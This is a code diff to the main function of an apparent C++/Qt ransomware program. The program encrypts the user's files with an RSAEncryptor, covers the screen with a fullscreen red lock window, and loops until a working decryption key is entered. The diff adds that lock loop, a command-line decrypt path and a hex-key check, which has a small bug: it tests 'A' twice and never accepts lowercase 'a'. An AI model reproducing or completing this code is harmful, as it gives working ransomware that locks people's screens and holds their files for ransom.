@@ -6,39 +6,66 @@
 
 using namespace boost::filesystem;
 
+bool is_hexa(const std::string& s)
+{
+    return !s.empty() && std::find_if(s.begin(),
+        s.end(), [](unsigned char c) {
+        return !std::isdigit(c)
+                && c != 'A' && c != 'A'
+                && c != 'B' && c != 'b'
+                && c != 'C' && c != 'c'
+                && c != 'D' && c != 'd'
+                && c != 'E' && c != 'e'
+                && c != 'F' && c != 'f'; }) == s.end();
+}
+
 int main(int argc, char *argv[])
 {
     QApplication a(argc, argv);
-    std::string key = "";
-
-    FolderService folderservice;
-    RSAEncryptor* encryptor = new RSAEncryptor();
-
-    folderservice.list_files_and_encrypt(encryptor);
-
     ScreenBlocker* screenBlocker = new ScreenBlocker();
     // Set the main window
     screenBlocker->setWindowTitle("My Window");
     screenBlocker->setStyleSheet("background-color: red;");
     // Show the window in fullscreen
     screenBlocker->showFullScreen();
-    screenBlocker->show();
-    a.exec();
 
-    QString Qkey = screenBlocker->getKey();
+    bool unblock = false;
+    std::string key = "";
 
-    if(Qkey != nullptr) {
-        key = Qkey.toStdString();
-    }
-    std::cout<<key<<std::endl;
+    FolderService folderservice;
+    RSAEncryptor* encryptor = new RSAEncryptor();
 
-    std::vector<std::string> files = folderservice.get_data_files();
-    for (std::string filePath : files) {
-        try {
-            encryptor->decryptFile(filePath, key);
-        } catch(Exception ex) {
-            std::cout << ex.what()<<std::endl;
+    if(argc == 2) {
+        key = argv[1];
+        if(!is_hexa(key)) {
+            std::cout<<"Wrong key type!"<<std::endl;
+            exit(0);
         }
+
+        try {
+            folderservice.list_files_and_decrypt(encryptor, key);
+        } catch (Exception ex) {
+            unblock = false;
+        }
+        exit(0);
+    }
+
+    folderservice.list_files_and_encrypt(encryptor);
+
+    while(!unblock) {
+        screenBlocker->show();
+        a.exec();
+
+        QString Qkey = screenBlocker->getKey();
+
+        if(Qkey != nullptr) {
+            key = Qkey.toStdString();
+        }
+
+        try {
+            folderservice.list_files_and_decrypt(encryptor, key);
+            unblock = true;
+        } catch (Exception ex) {}
     }
 
     delete encryptor;
